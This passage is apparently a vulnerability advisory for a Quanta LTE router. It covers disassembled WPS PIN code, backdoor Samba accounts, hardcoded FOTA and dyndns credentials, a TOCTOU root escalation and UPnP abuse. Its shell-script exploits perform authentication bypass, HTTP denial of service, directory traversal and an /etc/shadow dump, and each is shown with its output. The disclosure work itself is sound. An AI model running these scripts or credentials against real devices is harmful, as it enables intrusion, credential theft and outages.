.text:0001B8C8 var_2C          = -0x2C
.text:0001B8C8
.text:0001B8C8                 STMFD           SP!, {R4-R11,LR}
.text:0001B8CC                 SUB             SP, SP, #0x1C
.text:0001B8D0                 STR             R0, [SP,#0x40+s]
.text:0001B8D4                 MOV             R0, #0  ; timer
.text:0001B8D8                 BL              time
.text:0001B8DC                 BL              srand
.text:0001B8E0                 BL              rand
.text:0001B8E4                 LDR             R4, =0x6B5FCA6B
.text:0001B8E8                 MOV             R6, R0,ASR#31
.text:0001B8EC                 SMULL           R1, R4, R0, R4
.text:0001B8F0                 RSB             R10, R6, R4,ASR#22
.text:0001B8F4                 RSB             R12, R10, R10,LSL#5
.text:0001B8F8                 RSB             R2, R12, R12,LSL#6
.text:0001B8FC                 ADD             R11, R10, R2,LSL#3
.text:0001B900                 LDR             R8, =0xF423F
.text:0001B904                 ADD             R9, R11, R11,LSL#2
.text:0001B908                 SUB             R1, R0, R9,LSL#7
.text:0001B90C                 CMP             R1, R8
.text:0001B910                 ADDLS           R1, R1, #0xF4000
.text:0001B914                 ADDLS           R1, R1, #0x240
.text:0001B918                 ADD             R3, R1, R1,LSL#2
.text:0001B91C                 MOV             R3, R3,LSL#1
.text:0001B920                 LDR             R1, =0xCCCCCCCD
.text:0001B924                 LDR             R5, =0xA7C5AC5
.text:0001B928                 LDR             R6, =0x6B5FCA6B
.text:0001B92C                 MOV             R7, R3,LSR#5
.text:0001B930                 UMULL           R4, R7, R5, R7
.text:0001B934                 UMULL           R9, LR, R1, R3
.text:0001B938                 UMULL           R5, R6, R3, R6
.text:0001B93C                 LDR             R12, =0xD1B71759
.text:0001B940                 MOV             R6, R6,LSR#22
.text:0001B944                 UMULL           R10, R12, R3, R12
.text:0001B948                 MOV             LR, LR,LSR#3
.text:0001B94C                 UMULL           R10, R9, R1, R6
.text:0001B950                 UMULL           R8, R10, R1, LR
.text:0001B954                 LDR             R0, =0x431BDE83
.text:0001B958                 MOV             R12, R12,LSR#13
.text:0001B95C                 UMULL           R11, R0, R3, R0
.text:0001B960                 STR             R10, [SP,#0x40+var_38]
.text:0001B964                 UMULL           R8, R10, R1, R12
.text:0001B968                 LDR             R2, =0x51EB851F
.text:0001B96C                 LDR             R4, =0x10624DD3
.text:0001B970                 UMULL           R5, R2, R3, R2
.text:0001B974                 MOV             R0, R0,LSR#18
.text:0001B978                 STR             R10, [SP,#0x40+var_3C]
.text:0001B97C                 UMULL           R8, R4, R3, R4
.text:0001B980                 UMULL           R8, R10, R1, R0
.text:0001B984                 MOV             R2, R2,LSR#5
.text:0001B988                 MOV             R7, R7,LSR#7
.text:0001B98C                 UMULL           R8, R11, R1, R7
.text:0001B990                 STR             R10, [SP,#0x40+var_30]
.text:0001B994                 MOV             R4, R4,LSR#6
.text:0001B998                 UMULL           R8, R10, R1, R2
.text:0001B99C                 UMULL           R8, R5, R1, R4
.text:0001B9A0                 STR             R10, [SP,#0x40+var_2C]
.text:0001B9A4                 MOV             R8, R9,LSR#3
.text:0001B9A8                 MOV             R10, R11,LSR#3
.text:0001B9AC                 ADD             R11, R10, R10,LSL#2
.text:0001B9B0                 ADD             R9, R8, R8,LSL#2
.text:0001B9B4                 MOV             R10, R5,LSR#3
.text:0001B9B8                 LDR             R8, [SP,#0x40+var_38]
.text:0001B9BC                 SUB             R6, R6, R9,LSL#1
.text:0001B9C0                 SUB             R7, R7, R11,LSL#1
.text:0001B9C4                 LDR             R9, [SP,#0x40+var_3C]
.text:0001B9C8                 LDR             R11, [SP,#0x40+var_30]
.text:0001B9CC                 ADD             R5, R10, R10,LSL#2
.text:0001B9D0                 SUB             R5, R4, R5,LSL#1
.text:0001B9D4                 LDR             R4, [SP,#0x40+var_2C]
.text:0001B9D8                 MOV             R10, R8,LSR#3
.text:0001B9DC                 MOV             R8, R9,LSR#3
.text:0001B9E0                 MOV             R9, R11,LSR#3
.text:0001B9E4                 ADD             R7, R7, R6
.text:0001B9E8                 ADD             R10, R10, R10,LSL#2
.text:0001B9EC                 ADD             R9, R9, R9,LSL#2
.text:0001B9F0                 MOV             R11, R4,LSR#3
.text:0001B9F4                 ADD             R8, R8, R8,LSL#2
.text:0001B9F8                 ADD             R7, R7, R5
.text:0001B9FC                 SUB             LR, LR, R10,LSL#1
.text:0001BA00                 SUB             R5, R0, R9,LSL#1
.text:0001BA04                 SUB             R8, R12, R8,LSL#1
.text:0001BA08                 ADD             R11, R11, R11,LSL#2
.text:0001BA0C                 ADD             R12, R7, LR
.text:0001BA10                 SUB             R4, R2, R11,LSL#1
.text:0001BA14                 ADD             R8, R8, R5
.text:0001BA18                 ADD             R5, R8, R4
.text:0001BA1C                 ADD             R0, R12, R12,LSL#1
.text:0001BA20                 ADD             R4, R5, R0
.text:0001BA24                 UMULL           R5, R1, R4, R1
.text:0001BA28                 MOV             R2, R1,LSR#3
.text:0001BA2C                 ADD             LR, R2, R2,LSL#2
.text:0001BA30                 SUB             R8, R4, LR,LSL#1
.text:0001BA34                 LDR             R0, =0x66666667
.text:0001BA38                 RSB             R2, R8, #0xA
.text:0001BA3C                 SMULL           R8, R0, R2, R0
.text:0001BA40                 MOV             R12, R2,ASR#31
.text:0001BA44                 RSB             R1, R12, R0,ASR#2
.text:0001BA48                 ADD             LR, R1, R1,LSL#2
.text:0001BA4C                 LDR             R12, =(__FUNCTION__.9079 - 0x1BA64)
.text:0001BA50                 SUB             R4, R2, LR,LSL#1
.text:0001BA54                 LDR             R2, =(aGet_wpspinI - 0x1BA70)
.text:0001BA58                 ADD             R4, R4, R3
.text:0001BA5C                 ADD             R0, PC, R12 ; "hostapd_conf_file_gen"
.text:0001BA60                 ADD             R0, R0, #0x3C
.text:0001BA64                 MOV             R1, #0x3D
.text:0001BA68                 ADD             R2, PC, R2 ; "Get_WpsPin:%in"
.text:0001BA6C                 MOV             R3, R4
.text:0001BA70                 BL              wifi_filelog
.text:0001BA74                 LDR             R1, =(a08lu - 0x1BA84)
.text:0001BA78                 LDR             R0, [SP,#0x40+s] ; s
.text:0001BA7C                 ADD             R1, PC, R1 ; "%08lu"
.text:0001BA80                 MOV             R2, R4
.text:0001BA84                 ADD             SP, SP, #0x1C
.text:0001BA88                 LDMFD           SP!, {R4-R11,LR}
.text:0001BA8C                 B               sprintf
.text:0001BA8C ; End of function generate_wlan_wps_enrollee_pin
</code></pre>
<p><a id="backdoor-accounts-in-samba"></a></p>
<h2>Details - Backdoor accounts in Samba</h2>
<p>Samba is configured to run by default and the <code>/bin/genpasswd</code> program configures the different accounts.</p>
<p>As seen in the IDA screenshot, multiple backdoors accounts are created:</p>
<ul>
<li>admin with the password 1234</li>
<li>support with the password 1234</li>
<li>user with the password 1234</li>
<li>nobody with the password 1234</li>
</ul>
<p>From <code>/bin/genpasswd</code>:</p>
<p><img alt="" src="images/2016-quanta-gen-password-pseudo-code.png" /></p>
<p>The resulting file (<code>/usr/pc/samga/etc/passwd</code>) is:</p>
<pre><code>admin:6HgsSsJIEOc2U:0:0:Administrator:/:/bin/sh
support:Ead09Ca6IhzZY:0:0:Technical Support:/:/bin/sh
user:tGqcT.qjxbEik:0:0:Normal User:/:/bin/sh
nobody:VBcCXSNG7zBAY:0:0:nobody for ftp:/:/bin/sh
</code></pre>
<p>And john confirms the passwords:</p>
<pre><code>user@kali:~$ john -show usr-pc-samba-etc-passwd 
admin:1234:0:0:Administrator:/:/bin/sh
support:1234:0:0:Technical Support:/:/bin/sh
user:1234:0:0:Normal User:/:/bin/sh
nobody:1234:0:0:nobody for ftp:/:/bin/sh

4 password hashes cracked, 0 left
user@kali:~$
</code></pre>
<p>When Samba starts, the passwd file is copied into <code>/var/pc/samba/etc/passwd</code>.</p>
<p><a id="leaking-no-ip-account"></a></p>
<h2>Details - Leaking No-IP account (?):</h2>
<p>The file <code>/etc/inadyn-mt.conf</code> (for a dyndns client) contains an user and a hardcoded password. I don't know if it is used:</p>
<pre><code>--log_file /usr/inadyn_srv.log
--forced_update_period 6000
--username alex_hung
--password 641021
--dyndns_system default@no-ip.com
--alias test.no-ip.com
</code></pre>
<p><a id="remote-fota"></a></p>
<h2>Details - Remote FOTA (Firmware Over The Air)</h2>
<p>The credentials to contact the FOTA server are hardcoded in the <code>/sbin/fotad</code> binary, as shown with this IDA screenshot:</p>
<p><img alt="" src="images/2016-quanta-sbin-fota-http-req.png" /></p>
<p>The function sub_C8A4 contains the credentials as base64-strings, used to retrieve the firmware.</p>
<p>It's notable the FOTA daemon tries to retrieve the firmware over HTTPS. But at the date of the writing,
the SSL certificate for <a href="https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml">https://qdp:qdp@fotatest.qmitw.com/qdh/ispname/2031/appliance.xml</a> is invalid for 1 year.</p>
<p><img alt="" src="images/2016-quanta-sbin-fota-http-req-auth-passwords.png" /></p>
<p>The user/password combinaisons are:</p>
<pre><code>qdpc:qdpc
qdpe:qdpe
qdp:qdp
</code></pre>
<p><a id="toctou-lpe"></a></p>
<h2>Details - TOCTOU vulnerability in QCMAP_ConnectionManager - LPE</h2>
<p>This program is started at boot as root. The function sub_131F4 creates the <code>/etc/guest_access_rules.sh</code> file, then fills it with ebtables commands, then <code>chmod 777 /etc/guest_access_rules.sh</code> (!), then executes <code>/etc/guest_access_rules.sh</code> (as root) and then removes it from the filesystem.</p>
<p>The local admin user (without root privileges) can use this TOCTOU vulnerability to gain root privileges in the router. Chmoding 777 a file and then executing it as root doesn't seem to be a good idea.</p>
<p>ds_system_call() is a wrapper to system().</p>
<p>Beginning of the sub_131F4 function (<code>/etc/guest_access_rules.sh</code> is opened and ebtables are created):</p>
<p><img alt="" src="images/2016-quanta-toctou-01.png" /></p>
<p>End of the sub_131F4 function, where the TOCTOU vulnerability is located:</p>
<p><img alt="" src="images/2016-quanta-toctou-02.png" /></p>
<p>The attentive reader will comment that the program doesn't check if the file <code>/etc/guest_access_rules.sh</code> already existed and if it was owned by a non-root user before doing a fopen (file, "w"), so this user would keep the rights on the file during all the execution of the function, allowing him to add some commands into the file. He will be right to note this is not a best security practice.</p>
<p><a id="default-wifi-password-weakness"></a></p>
<h2>Details - Default Wifi Password Weakness</h2>
<p>By default, Wifi password is provided as a 8-char string. It's composed of [A-Z]{8}. It's possible to bruteforce it very fast using a WPA handshake.</p>
<p><a id="http-dos"></a></p>
<h2>Details - HTTP DoS</h2>
<p>By sending multiple authenticated http requests to a webservice allowing to retrieve anti-csrf tokens (security feature!), it is possible to get the qmiweb daemon (http daemon) to use 100% of CPU and to become unresponsive.
The service doesn't check the number of requested anti-csrf tokens by the client, so it is possible to request a large number of tokens, resulting in the blocking of the HTTP server.</p>
<p>Problematic HTTP request:</p>
<pre><code>GET /data.ria?token=1000000000000000 HTTP/1.1
Host: 192.168.1.1
Cookie: qSessId=oTgVebjXWXcApoyb
</code></pre>
<p>PoC:</p>
<pre><code>user@kali:~$ cat quanta-dos-http.sh 
#!/bin/sh

TMP_DIR=$(mktemp -d)

echo -n "Stage [1] - Bypassing authentication ..."

wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
echo " OK"

echo -n "Stage [2] - DoS ..."
http_login=$(echo $http_login | tr -d '\r')
http_password=$(echo $http_password | tr -d '\r')
http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
for i in $(seq 0 10)
do
  wget -qO/dev/null --header="Cookie: ${http_session}hey-i-dont-think-your-parsing-of-cookies-works-well" "http://192.168.1.1/data.ria?token=100000000000000" &amp;
done
echo " OK"
echo "Done. The HTTP server is surely unresponsive now."

user@kali:~$ ./quanta-dos-http.sh 
Stage [1] - Bypassing authentication ... OK
Stage [2] - DoS ... OK
Done. The HTTP server is surely unresponsive now.
user@kali:~$ 
user@kali:~$ 
user@kali:~$ wget http://192.168.1.1
--2015-12-04 17:04:07--  http://192.168.1.1/
Connecting to 192.168.1.1:80... connected.
HTTP request sent, awaiting response...

^C
user@kali:~$
</code></pre>
<p>Alternatively, you can fetch the exploit at <a href="https://pierrekim.github.io/advisories/quanta-dos-http.sh">https://pierrekim.github.io/advisories/quanta-dos-http.sh</a>.</p>
<p>In the router, the <code>/bin/qmiweb</code> program uses all the CPU.</p>
<pre><code>Mem: 40252K used, 128664K free, 0K shrd, 20K buff, 14804K cached
CPU: 31.2% usr 65.5% sys  0.0% nic  0.0% idle  0.0% io  0.0% irq  3.1% sirq
Load average: 7.71 4.38 2.16 2/214 1256
  PID  PPID USER     STAT   VSZ %MEM CPU %CPU COMMAND
  797     1 root     S     107m 64.8   0 98.4 /bin/qmiweb
</code></pre>
<p><a id="arbitrary-file-browsing-using-the-http-daemon"></a></p>
<h2>Details - Arbitrary file browsing using the http daemon</h2>
<p>If an usb key or an usb hard disk is connected to the router, then it's possible to do arbitrary browsing using the http daemon in file system of the router using root privileges.</p>
<p>The problem is the function in the http daemon which doesn't clean <code>../../</code> in the HTTP requests.</p>
<p>Using the provided exploit: the exploit uses the information leak to use the login/password to get a valid cookie session and then exploits the vulnerability in the http daemon.</p>
<p>PoC to browse the / directory of the router:</p>
<pre><code>user@kali:~$ ./quanta-http-directory-listing.sh
{"query_path":"/../../../../","dir_list":[
{"name":"www","type":1,"date":"2014/12/10 02:26:44","size":0},
{"name":"usr","type":1,"date":"1970/01/01 00:02:23","size":0},
{"name":"config2","type":1,"date":"2016/02/24 17:26:07","size":0},
{"name":"build.prop","type":2,"date":"2014/12/10 02:27:50","size":38},
{"name":"sdcard","type":1,"date":"2016/01/28 18:34:47","size":0},
{"name":"home","type":1,"date":"2016/01/30 18:55:25","size":0},
{"name":"sbin","type":1,"date":"2014/12/10 02:27:50","size":0},
{"name":"bin","type":1,"date":"2014/12/10 02:27:49","size":0},
{"name":"media","type":1,"date":"2014/12/10 02:26:38","size":0},
{"name":"boot","type":1,"date":"2014/12/10 02:15:37","size":0},
{"name":"mnt","type":1,"date":"2014/12/10 02:26:38","size":0},
{"name":"sys","type":1,"date":"1970/01/01 02:43:27","size":0},
{"name":"disk","type":1,"date":"2014/12/10 02:26:38","size":0},
{"name":"WEBSERVER","type":1,"date":"2014/12/10 02:26:39","size":0},
{"name":"lib","type":1,"date":"2016/02/24 17:13:53","size":0},
{"name":"dev","type":1,"date":"2016/02/24 19:43:52","size":0},
{"name":"proc","type":1,"date":"1970/01/01 00:00:00","size":0},
{"name":"linuxrc","type":2,"date":"2014/12/10 02:16:02","size":1906904},
{"name":".ash_history","type":2,"date":"2016/02/24 16:44:14","size":1693},
{"name":"tmp","type":1,"date":"2016/02/24 19:23:31","size":0},
{"name":"etc","type":1,"date":"2016/02/24 19:23:28","size":0},
{"name":"config","type":1,"date":"2016/02/24 19:43:52","size":0},
{"name":"lost+found","type":1,"date":"1970/01/01 02:43:26","size":0},
{"name":"var","type":1,"date":"2016/02/24 19:43:52","size":0},
{"name":"cache","type":1,"date":"2016/02/24 16:43:38","size":0}]}
user@kali:~$
</code></pre>
<p>Source of the exploit:</p>
<pre><code>user@kali:~$ cat quanta-http-directory-listing.sh
#!/bin/sh

TMP_DIR=$(mktemp -d)

wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
http_login=$(echo $http_login | tr -d '\r')
http_password=$(echo $http_password | tr -d '\r')
http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
wget -qO- --header="Cookie: ${http_session}" "http://192.168.1.1/data.ria?CfgType=storage_status&amp;dir_path=/../../../../"
user@kali:~$
</code></pre>
<p>Alternatively, you can fetch the exploit at <a href="https://pierrekim.github.io/advisories/quanta-http-directory-listing.sh">https://pierrekim.github.io/advisories/quanta-http-directory-listing.sh</a>.</p>
<p><a id="arbitrary-file-reading-using-the-http-daemon"></a></p>
<h2>Details - Arbitrary file reading using the http daemon</h2>
<p>If an usb key or an usb hard disk is connected to the router, then it's possible to do arbitrary file reading in the file system of the router using root privileges.</p>
<p>The problem is the function in the http daemon which does clean the <code>../../</code> strings in the requests but not hex-encoded '/' (%2f) characters.</p>
<p>Using the provided exploit: the exploit uses the information leak to use the login/password to get a valid cookie session and then exploits the vulnerability in the http daemon.</p>
<p>PoC to retrieve the <code>/etc/shadow</code> file:</p>
<pre><code>user@kali:~$ ./quanta-http-file.sh
root:aRDiHrJ0OkehM:16414:0:99999:7:::
daemon:*:16414:0:99999:7:::
bin:*:16414:0:99999:7:::
sys:*:16414:0:99999:7:::
sync:*:16414:0:99999:7:::
games:*:16414:0:99999:7:::
man:*:16414:0:99999:7:::
lp:*:16414:0:99999:7:::
mail:*:16414:0:99999:7:::
news:*:16414:0:99999:7:::
uucp:*:16414:0:99999:7:::
proxy:*:16414:0:99999:7:::
www-data:*:16414:0:99999:7:::
backup:*:16414:0:99999:7:::
list:*:16414:0:99999:7:::
irc:*:16414:0:99999:7:::
gnats:*:16414:0:99999:7:::
diag:*:16414:0:99999:7:::
nobody:*:16414:0:99999:7:::
messagebus:!:16414:0:99999:7:::
avahi:!:16414:0:99999:7:::
user@kali:~$
</code></pre>
<p>Source of the exploit:</p>
<pre><code>user@kali:~$ cat quanta-http-file.sh
#!/bin/sh

TMP_DIR=$(mktemp -d)

wget -qO${TMP_DIR}/stage1-axx 'http://192.168.1.1/data.ria?CfgType=get_homeCfg&amp;file=system'
http_login=$(grep web_usrname ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
http_password=$(grep web_passwd ${TMP_DIR}/stage1-axx | tail -n 1 | sed -e 's#"##g;s#=# #' | awk '{ print $2 }')
http_login=$(echo $http_login | tr -d '\r')
http_password=$(echo $http_password | tr -d '\r')
http_session=$(wget -qO/dev/null --server-response --post-data="uname=$http_login&amp;passwd=$http_password" http://192.168.1.1/login.cgi 2&gt;&amp;1 | grep Cooki | awk '{ print $2 }')
http_csrf_token=$(wget -qO- --header="Cookie: ${http_session=}" "http://192.168.1.1/data.ria?token=1")
wget -qO- --header="Cookie: ${http_session}" "http://192.168.1.1/storage_download/..%2f..%2f..%2f..%2f../etc/shadow"
user@kali:~$
</code></pre>
<p>Alternatively, you can fetch the exploit at <a href="https://pierrekim.github.io/advisories/quanta-http-file.sh">https://pierrekim.github.io/advisories/quanta-http-file.sh</a>.</p>
<p><a id="network-eavesdropping"></a></p>
<h2>Details - Network Eavesdropping - Interception with the gglogd program</h2>
<p>By default, the available pcap library is not located in the good path and tcpdump doesn't work (missing lib).</p>
<p>The <code>/bin/gglogd</code> program is interesting because it fixes the tcpdump dependencies by moving libpcap into the correct directory, as shown in IDA screenshots.</p>
<p>Then, the <code>/bin/gglogd</code> program will log all the traffic passing through the bridge0 (wlan0+eth* : wireless and ethernet) and the LTE interface (rmnet0). The resulting interception files will be written into the flash memory, so "somebody" can retrieve the logged traffic even if the router is rebooted.</p>
<p>Fixing tcpdump library:</p>
<p><img alt="" src="images/2016-quanta-gglogd-pcap-fix-00.png" /></p>
<p>Execution of tcpdump:</p>
<p><img alt="" src="images/2016-quanta-gglogd-pcap-fix-01.png" /></p>
<p><code>/bin/gglogd</code> is not started by default but it is suspicious that (1) this kind of the program is present in this router, (2) the program will fix the tcpdump dependencies on its own (tcpdump doesn't work by default in the firmware image) and (3) intercepting files are stored in a persistent storage. This intrigues further thoughts what the developer wanted to achieve from these settings.</p>
<p><strong>This is not a vulnerability but an interesting fact.</strong></p>
<p><a id="misc"></a></p>
<h2>Details - Misc</h2>
<p>Samba is started if a FAT32 usb disk is connected. The provided Samba version (3.0.25b) is outdated : 9 year old and is prone to =~ 28 CVEs allowing an attacker to execute arbitrary code as root. I advise users not to connect usb disks to this device, connecting an usb disks will start the samba daemons.</p>
<p>Dropbear is outdated (v2011.54).</p>
<p><a id="security-removed-in-upnp"></a></p>
<h2>Details - Security removed in UPnP</h2>
<p>UPnP allows to add firewall rules dynamically. Because of the security risks involved, generally there are restrictions in place to avoid dangerous new firewall rules from an unstrusted LAN client.</p>
<p>Insecurity in IPnP was hype 10 years ago (in 2006). The security level of the UPNP program (miniupnp) in this router is lowered volontary as shown below and allows an attacker located in the LAN area to add Port forwarding from the Internet to other clients located in the LAN:</p>
<p>From <code>/var/miniupnpd.conf</code>:</p>
<pre><code>ext_ifname=rmnet0
listening_ip=bridge0
port=2869
enable_natpmp=yes
enable_upnp=yes
bitrate_up=14000000
bitrate_down=14000000
secure_mode=no      # "secure" mode : when enabled, UPnP client are allowed to add mappings only to their IP.
presentation_url=http://192.168.1.1
system_uptime=yes
notify_interval=30
upnp_forward_chain=MINIUPNPD
upnp_nat_chain=MINIUPNPD
</code></pre>
<p>There is no restriction about the UPnP permission rules in the configuration file, contrary to common usage in UPnP where it is advised to only allow redirection of port above 1024:</p>
<p>Normal config file:</p>
<pre><code># UPnP permission rules
# (allow|deny) (external port range) ip/mask (internal port range)
# A port range is &lt;min port&gt;-&lt;max port&gt; or &lt;port&gt; if there is only
# one port in the range.
# ip/mask format must be nn.nn.nn.nn/nn
# it is advised to only allow redirection of port above 1024
# and to finish the rule set with "deny 0-65535 0.0.0.0/0 0-65535"
allow 1024-65535 192.168.0.0/24 1024-65535
deny 0-65535 0.0.0.0/0 0-65535
</code></pre>
<p>In the configuration of the vulnerable router where there are no permission rules, an attacker can forward everything from the WAN into the LAN.
From example, an attacker can add a forwarding rule in order to allow traffic from the Internet to local Exchange servers, mail servers, ftp servers, http servers, database servers...
In fact, this lack of security allows a local user to forward what they want from the Internet into the LAN as shown below with the miranda tool.</p>
<pre><code>user@kali:~$ miranda
upnp&gt; msearch

Entering discovery mode for 'upnp:rootdevice', Ctl+C to stop...

****************************************************************
SSDP reply message from 192.168.1.1:2869
XML file is located at http://192.168.1.1:2869/rootDesc.xml
Device is running / UPnP/1.1 MiniUPnPd/1.8
****************************************************************

^CDiscover mode halted...

upnp&gt; host list

    [0] 192.168.1.1:2869

upnp&gt; host get 0

Requesting device and service info for 192.168.1.1:2869 (this could take a few seconds)...

Host data enumeration complete!

upnp&gt; host info 0

xmlFile : http://192.168.1.1:2869/rootDesc.xml
name : 192.168.1.1:2869
proto : http://
serverType : / UPnP/1.1 MiniUPnPd/1.8
upnpServer : / UPnP/1.1 MiniUPnPd/1.8
dataComplete : True
deviceList : {}

upnp&gt; host info 0 deviceList

InternetGatewayDevice : {}
WANDevice : {}
WANConnectionDevice : {}

upnp&gt; host info 0 deviceList WAN
WANConnectionDevice   WANDevice

upnp&gt; host info 0 deviceList WANConnectionDevice services WANIPConnection actions

AddPortMapping : {}
GetNATRSIPStatus : {}
GetGenericPortMappingEntry : {}
GetSpecificPortMappingEntry : {}
ForceTermination : {}
GetExternalIPAddress : {}
GetConnectionTypeInfo : {}
GetListOfPortMappings : {}
GetStatusInfo : {}
SetConnectionType : {}
DeletePortMappingRange : {}
DeletePortMapping : {}
RequestConnection : {}
AddAnyPortMapping : {}

upnp&gt; host summary 0

Host: 192.168.1.1:2869
XML File: http://192.168.1.1:2869/rootDesc.xml
InternetGatewayDevice
    modelName: Quanta Mobile Router
    UPC: 000000000000
    modelNumber: 1
    presentationURL: http://192.168.1.1
    friendlyName: Quanta Mobile Router
    fullName: urn:schemas-upnp-org:device:InternetGatewayDevice:2
    UDN: uuid:56f610e0-0fb9-11e3-8ffd-0800200c9a66
    modelURL: http://192.168.1.1
    manufacturer: Quanta
WANDevice
    modelName: Quanta Mobile Router
    UPC: 000000000000
    modelNumber: Quanta Mobile Router
    friendlyName: Quanta Mobile Router
    fullName: urn:schemas-upnp-org:device:WANDevice:2
    UDN: uuid:56f610e1-0fb9-11e3-8ffd-0800200c9a66
    modelURL: http://192.168.1.1
    manufacturer: Quanta
WANConnectionDevice
    modelName: Quanta Mobile Router
    UPC: 000000000000
    modelNumber: Quanta Mobile Router
    friendlyName: Quanta Mobile Router
    fullName: urn:schemas-upnp-org:device:WANConnectionDevice:2
    UDN: uuid:56f610e2-0fb9-11e3-8ffd-0800200c9a66
    modelURL: http://192.168.1.1
    manufacturer: Quanta


upnp&gt; host send 0 WANConnectionDevice WANIPConnection AddPortMapping

Required argument:
    Argument Name:  NewPortMappingDescription
    Data Type:      string
    Allowed Values: []
    Set NewPortMappingDescription value to: net-to-internal-http-server

Required argument:
    Argument Name:  NewLeaseDuration
    Data Type:      ui4
    Allowed Values: []
    Value Min:      0
    Value Max:      604800
    Set NewLeaseDuration value to: 0

Required argument:
    Argument Name:  NewInternalClient
    Data Type:      string
    Allowed Values: []
    Set NewInternalClient value to: 192.168.1.101

Required argument:
    Argument Name:  NewEnabled
    Data Type:      boolean
    Allowed Values: []
    Set NewEnabled value to: 1

Required argument:
    Argument Name:  NewExternalPort
    Data Type:      ui2
    Allowed Values: []
    Set NewExternalPort value to: 80

Required argument:
    Argument Name:  NewRemoteHost
    Data Type:      string
    Allowed Values: []
    Set NewRemoteHost value to:

Required argument:
    Argument Name:  NewProtocol
    Data Type:      string
    Allowed Values: ['TCP', 'UDP']
    Set NewProtocol value to: TCP

Required argument:
    Argument Name:  NewInternalPort
    Data Type:      ui2
    Allowed Values: []
    Value Min:      1
    Value Max:      65535
    Set NewInternalPort value to: 80

upnp&gt; exit

Bye!

user@kali:~$
</code></pre>
<p>Firewall rules in the router before an attacker (with IP 192.168.1.2) uses UPnP:</p>
<pre><code>root@homerouter:~# iptables-save | grep  UPNP
:MINIUPNPD - [0:0]
-A PREWAN -j MINIUPNPD
:MINIUPNPD - [0:0]
-A FORWARD -o bridge0 -m mark --mark 0x11 -j MINIUPNPD
root@homerouter:~#
</code></pre>
<p>Firewall rules in the router after an attacker (with IP 192.168.1.2) uses UPnP:</p>
<pre><code>root@homerouter:~# iptables-save | grep  UPNP
:MINIUPNPD - [0:0]
-A MINIUPNPD -p tcp -m tcp --dport 80 -j DNAT --to-destination 192.168.1.101:80
-A PREWAN -j MINIUPNPD
:MINIUPNPD - [0:0]
-A FORWARD -o bridge0 -m mark --mark 0x11 -j MINIUPNPD
-A MINIUPNPD -d 192.168.1.101/32 -p tcp -m tcp --dport 80 -j ACCEPT
root@homerouter:~#
</code></pre>
<p>A new firewall rule allowing traffic from the Internet to a local HTTP server (192.168.1.101) was sucessfully added.</p>
<p><a id="undocumented-diagnostic-webpage"></a></p>
<h2>Details - Undocumented diagnostic webpage</h2>
<p>The webpage at <code>http://192.168.1.1/diaglogs_page.htm</code> (needs a valid session) gives new parameters to edit:</p>
<ul>
<li>QXDM Filter (?),</li>
<li>Download Mode Configuration when modem crash occured,</li>
<li>usb_factory_pid,</li>
<li>Web Redirect(?),</li>
<li>FOTA test Configuration,</li>
<li>LTE modem Configuration,</li>
<li>LTE Band Preferences Configuration,</li>
<li>SMS Self-Registration Debug Test,</li>
<li>Sending SMS PDU Test,</li>
<li>Editing TR069 Configuration,</li>
<li>WLAN (802.11b, bg, bgn)</li>
</ul>
<p><img alt="" src="images/2016-quanta-diaglogs_page.htm.png" /></p>
<p>This is not a vulnerability but an interesting hidden functionality.</p>
<h2>Personal notes</h2>
<p>As the router has a sizable memory (168 MB), a decent CPU and good free space (235 MB) with complete toolkits installed by default (sshd, proxy (<code>/bin/tinyproxy -c /var/tproxy.conf</code>), tcpdump ...), I advise users to trash their routers because it's trivial for an attacker to use this router as an attack vector (ie: hosting a sniffing tool, LAN hacking, active MiTM tool, spamming zombie).</p>
<p>The reader must understand that not all the vulnerabilities have been disclosed. There is a lot of interesting undisclosed findings in this router (including RCEs) and I encourage security researchers to analyze the binaries provided by the firmware (We can agree I already did my part).</p>
<p>Given the vulnerabilities found, even if the vendor changes its mind and decides to patch the router, I don't think it is even possible as it needs major rewrites in several main components (the ASM code shows very bad security practices in several binaries).</p>
<p>From my tests, it is possible to overwrite the firmware with a custom (backdoored) firmware. Generating a valid backdoored firmware is left as an exercise for the reader, but with all these included vulnerabilities in the default firmware, I don't think it is worth making the effort.</p>
<p>To illustrate the precedent fact, here is the current available space in the router:</p>
<pre><code>root@homerouter:~# df-h 
Filesystem                Size      Used Available Use% Mounted on
/dev/root                60.4M     36.2M     24.2M  60% /
tmpfs                    64.0K         0     64.0K   0% /dev
tmpfs                    82.5M         0     82.5M   0% /dev/shm
/var                     82.5M    968.0K     81.5M   1% /var
/dev/mtdblock24          60.4M     27.1M     33.3M  45% /usr
/dev/mtdblock16          10.1M      1.4M      8.7M  14% /config
/dev/mtdblock17          10.1M      1.3M      8.8M  13% /config2
/dev/mtdblock18          80.4M      1.3M     79.1M   2% /cache
root@homerouter:~
</code></pre>
<h2>Tribute to Alex</h2>
<p>The <code>/var/alex</code> directory is used as a storage directory for logs. This in a non conventional path and seems to be named after one of the programmer's name. Hello Alex !</p>
<p>In Samba:</p>
<p><img alt="" src="images/2016-quanta-alex-samba.png" /></p>
<p>In the Firmware Over The Air program:</p>
<p><img alt="" src="images/2016-quanta-alex-sbin-fotad.png" /></p>
<h2>Having fun with the LEDs:</h2>
<p>This device has a lot of LEDs and an user can control them.</p>
